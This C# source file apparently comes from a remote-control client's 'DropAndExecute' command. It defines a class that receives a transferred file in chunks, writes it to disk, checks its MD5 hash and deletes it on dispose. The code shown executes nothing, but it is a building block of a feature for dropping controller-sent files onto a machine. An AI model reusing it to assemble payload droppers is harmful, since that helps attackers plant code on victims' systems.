using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.DropAndExecute
{
    public class TransferedFileInfo : IDisposable
    {
        private readonly int _length;
        private readonly byte[] _hash;
        private FileStream _fileStream;

        public TransferedFileInfo(FileTransferInfo fileTransferInfo, string targetDirectory)
        {
            Guid = fileTransferInfo.Guid;
            _length = fileTransferInfo.Length;
            _hash = fileTransferInfo.Hash;
            FileName = FileExtensions.MakeUnique(Path.Combine(targetDirectory, fileTransferInfo.Name));
            _fileStream = new FileStream(FileName, FileMode.CreateNew, FileAccess.ReadWrite);
        }

        public Guid Guid { get; }
        public string FileName { get; }
        public bool IsFinished { get; private set; }

        public bool? ReceiveData(byte[] data, int index, int length)
        {
            _fileStream.Write(data, index, length);
            if (_fileStream.Length == _length)
            {
                IsFinished = true;

                _fileStream.Position = 0;
                try
                {
                    using (var md5 = new MD5CryptoServiceProvider())
                    {
                        var computedHash = md5.ComputeHash(_fileStream);
                        return computedHash.SequenceEqual(_hash);
                    }
                }
                finally
                {
                    _fileStream.Dispose();
                    _fileStream = null;
                }
            }

            return null;
        }

        public void Dispose()
        {
            _fileStream?.Dispose();
            try
            {
                File.Delete(FileName);
                return;
            }
            catch (Exception)
            {
                // ignored
            }

            Thread.Sleep(1000);

            try
            {
                File.Delete(FileName);
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}